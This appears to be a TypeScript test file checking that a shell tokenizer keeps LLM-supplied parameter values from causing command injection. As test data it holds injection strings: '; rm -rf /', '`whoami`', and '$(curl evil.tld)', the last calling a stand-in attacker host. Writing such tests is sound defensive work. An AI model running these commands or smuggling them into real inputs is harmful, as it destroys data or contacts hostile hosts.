/**
 * Shell Tokenizer tests (Brief 170)
 *
 * Verifies that CLI command templates tokenize into safe argv entries and
 * that LLM-supplied parameter values cannot cause shell interpretation
 * (injection, word-splitting, or argument leakage).
 */

import { describe, it, expect } from "vitest";
import {
  tokenizeCommandTemplate,
  substituteArgv,
  formatArgvForLog,
} from "./shell-tokenizer";

describe("shell-tokenizer", () => {
  describe("tokenizeCommandTemplate", () => {
    it("splits simple command on whitespace", () => {
      const entries = tokenizeCommandTemplate("gh issue list");
      expect(entries).toHaveLength(3);
      expect(entries[0]).toEqual([{ type: "literal", value: "gh" }]);
      expect(entries[1]).toEqual([{ type: "literal", value: "issue" }]);
      expect(entries[2]).toEqual([{ type: "literal", value: "list" }]);
    });

    it("treats single-quoted spans as one argv entry", () => {
      const entries = tokenizeCommandTemplate("gh issue create --title 'hello world'");
      expect(entries).toHaveLength(5);
      expect(entries[4]).toEqual([{ type: "literal", value: "hello world" }]);
    });

    it("treats double-quoted spans as one argv entry", () => {
      const entries = tokenizeCommandTemplate('echo "hello world"');
      expect(entries).toHaveLength(2);
      expect(entries[1]).toEqual([{ type: "literal", value: "hello world" }]);
    });

    it("captures placeholders as placeholder tokens", () => {
      // argv: [gh, issue, view, {number}, --repo, {repo}]
      const entries = tokenizeCommandTemplate("gh issue view {number} --repo {repo}");
      expect(entries[3]).toEqual([{ type: "placeholder", name: "number" }]);
      expect(entries[5]).toEqual([{ type: "placeholder", name: "repo" }]);
    });

    it("handles placeholders inside quotes (real github.yaml pattern)", () => {
      const entries = tokenizeCommandTemplate(
        "gh issue create --repo {repo} --title '{title}'",
      );
      // argv: [gh, issue, create, --repo, {repo}, --title, {title}]
      expect(entries).toHaveLength(7);
      expect(entries[6]).toEqual([{ type: "placeholder", name: "title" }]);
    });

    it("handles mixed literal + placeholder in one entry", () => {
      const entries = tokenizeCommandTemplate("curl prefix-{id}.example.com");
      expect(entries).toHaveLength(2);
      expect(entries[1]).toEqual([
        { type: "literal", value: "prefix-" },
        { type: "placeholder", name: "id" },
        { type: "literal", value: ".example.com" },
      ]);
    });

    it("throws on unterminated single quote", () => {
      expect(() => tokenizeCommandTemplate("echo 'unterminated")).toThrow(
        /Unterminated single quote/,
      );
    });

    it("throws on unterminated double quote", () => {
      expect(() => tokenizeCommandTemplate('echo "unterminated')).toThrow(
        /Unterminated double quote/,
      );
    });

    it("preserves literal braces that are not valid placeholder syntax", () => {
      // `{not a name}` contains a space → not a placeholder → literal
      const entries = tokenizeCommandTemplate("echo {not a name}");
      expect(entries[1]).toEqual([{ type: "literal", value: "{not" }]);
    });

    it("tabs and newlines act as whitespace", () => {
      const entries = tokenizeCommandTemplate("a\tb\nc");
      expect(entries).toHaveLength(3);
    });
  });

  describe("substituteArgv", () => {
    it("substitutes placeholder values as single argv entries", () => {
      const entries = tokenizeCommandTemplate("gh issue view {number}");
      const argv = substituteArgv(entries, { number: 42 });
      expect(argv).toEqual(["gh", "issue", "view", "42"]);
    });

    it("injection attempt `; rm -rf /` stays one arg", () => {
      const entries = tokenizeCommandTemplate(
        "gh issue create --title '{title}'",
      );
      const malicious = "; rm -rf /";
      const argv = substituteArgv(entries, { title: malicious });
      // The title ends up as a single argv entry — exactly one arg, verbatim
      const injectionIndex = argv.indexOf(malicious);
      expect(injectionIndex).toBeGreaterThan(-1);
      // And nothing else was split out by the semicolon
      expect(argv).not.toContain("rm");
      expect(argv).not.toContain("-rf");
      expect(argv).not.toContain("/");
    });

    it("backticks in value survive as literal", () => {
      const entries = tokenizeCommandTemplate("echo {msg}");
      const argv = substituteArgv(entries, { msg: "`whoami`" });
      expect(argv).toEqual(["echo", "`whoami`"]);
    });

    it("$(...) in value survives as literal", () => {
      const entries = tokenizeCommandTemplate("echo {msg}");
      const argv = substituteArgv(entries, { msg: "$(curl evil.tld)" });
      expect(argv).toEqual(["echo", "$(curl evil.tld)"]);
    });

    it("newlines in value do not split into multiple args", () => {
      const entries = tokenizeCommandTemplate("echo {msg}");
      const argv = substituteArgv(entries, { msg: "line1\nline2\nline3" });
      expect(argv).toHaveLength(2);
      expect(argv[1]).toBe("line1\nline2\nline3");
    });

    it("unicode fancy quotes in value are preserved verbatim", () => {
      const entries = tokenizeCommandTemplate("echo {msg}");
      const argv = substituteArgv(entries, { msg: "\u201cfoo\u201d \u2018bar\u2019" });
      expect(argv).toEqual(["echo", "\u201cfoo\u201d \u2018bar\u2019"]);
    });

    it("empty string value preserved as empty argv entry", () => {
      const entries = tokenizeCommandTemplate("cmd {opt}");
      const argv = substituteArgv(entries, { opt: "" });
      expect(argv).toEqual(["cmd", ""]);
    });

    it("undefined value drops the entire argv entry", () => {
      const entries = tokenizeCommandTemplate("cmd --flag {value}");
      const argv = substituteArgv(entries, {});
      expect(argv).toEqual(["cmd", "--flag"]);
    });

    it("null value drops the entire argv entry", () => {
      const entries = tokenizeCommandTemplate("cmd --flag {value}");
      const argv = substituteArgv(entries, { value: null });
      expect(argv).toEqual(["cmd", "--flag"]);
    });

    it("missing placeholder in mixed entry drops the whole entry", () => {
      const entries = tokenizeCommandTemplate("cmd prefix-{id}.example");
      const argv = substituteArgv(entries, {});
      expect(argv).toEqual(["cmd"]);
    });
  });

  describe("formatArgvForLog", () => {
    it("quotes args containing shell metacharacters", () => {
      const formatted = formatArgvForLog("gh", ["issue", "create", "--title", "; rm -rf /"]);
      expect(formatted).toContain("'; rm -rf /'");
    });

    it("does not quote simple args", () => {
      const formatted = formatArgvForLog("gh", ["issue", "view", "42"]);
      expect(formatted).toBe("gh issue view 42");
    });

    it("escapes single quotes inside a quoted arg", () => {
      const formatted = formatArgvForLog("echo", ["it's here"]);
      expect(formatted).toBe("echo 'it'\\''s here'");
    });
  });
});
